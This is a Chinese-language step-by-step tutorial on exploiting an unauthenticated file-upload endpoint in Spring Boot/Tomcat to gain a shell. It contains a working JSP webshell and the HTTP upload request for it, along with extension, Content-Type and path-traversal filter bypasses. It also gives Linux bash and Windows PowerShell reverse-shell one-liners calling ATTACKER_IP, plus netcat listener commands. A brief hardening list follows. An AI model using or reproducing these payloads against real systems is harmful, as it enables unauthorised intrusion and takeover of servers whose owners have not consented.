### 利用未授权任意文件上传漏洞在 Spring Boot (Tomcat) 中 GetShell 的详细步骤

#### 漏洞原理
Spring Boot 默认使用 Tomcat 作为嵌入式容器。若存在**未授权任意文件上传接口**且未对上传文件类型、路径和内容校验，攻击者可直接上传恶意 JSP 文件，通过 Tomcat 解析执行获取服务器权限。

---

### 详细利用步骤

#### 1. **准备 JSP Webshell**
创建一个可执行系统命令的 JSP 文件（如 `shell.jsp`）：
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
// 基础命令执行 Webshell
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr); 
        disr = dis.readLine();
    }
}
%>
```

#### 2. **定位上传接口**
使用工具扫描或分析前端代码，找到未授权上传接口（如 `/upload`、`/api/upload`）。  
**关键特征**：  
- 无需认证（无 Cookie/Session 校验）
- 支持 `multipart/form-data` 请求

#### 3. **上传 Webshell**
通过 **Burp Suite** 或 **Curl** 发送上传请求：
```http
POST /unprotected-upload-endpoint HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); ... } %>
------WebKitFormBoundaryABC123--
```

#### 4. **绕过常见限制（可选）**
- **扩展名过滤**：尝试 `shell.jsp` → `shell.jpg.jsp`、`shell.jsp%00.jpg`
- **Content-Type 绕过**：  
  `Content-Type: image/jpeg`（实际内容为 JSP 代码）
- **路径遍历**：在文件名中加入目录穿越  
  `filename="../../webapps/ROOT/shell.jsp"`

#### 5. **确定 Webshell 访问路径**
Spring Boot 应用静态资源默认路径（需根据实际情况调整）：
```
http://target.com/uploads/shell.jsp        # 自定义上传目录
http://target.com/shell.jsp                # 直接上传到 ROOT
http://target.com/images/shell.jsp         # 静态资源目录
http://target.com/../webapps/ROOT/shell.jsp # 路径遍历后
```

#### 6. **执行命令 GetShell**
访问 Webshell 并执行系统命令：
```
http://target.com/uploads/shell.jsp?cmd=whoami
```
**关键命令**：
```bash
# Linux 反向 Shell
cmd=bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'

# Windows 反向 Shell
cmd=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### 7. **获取交互式 Shell**
在攻击机监听端口：
```bash
nc -lvnp 4444  # Linux
nc.exe -lvp 4444  # Windows
```
触发反向 Shell 连接后获得服务器权限。

---

### 加固建议
1. **身份校验**：为上传接口添加权限验证（如 Spring Security）。
2. **文件类型白名单**：校验 `Content-Type` 和文件扩展名。
   ```java
   String[] allowedTypes = {"image/jpeg", "image/png"};
   ```
3. **重命名文件**：使用随机文件名（避免用户控制扩展名）。
4. **隔离存储**：将上传目录置于 WebRoot 外，或通过控制器代理访问。
5. **删除执行权限**：在 Tomcat 配置中禁用上传目录的脚本执行：
   ```xml
   <!-- conf/web.xml -->
   <servlet>
     <servlet-name>default</servlet-name>
     <init-param>
        <param-name>readonly</param-name>
        <param-value>true</param-value>
     </init-param>
   </servlet>
   ```

> **注意**：实际利用需根据目标环境调整路径和绕过方式。漏洞利用后应立即通知厂商修复。
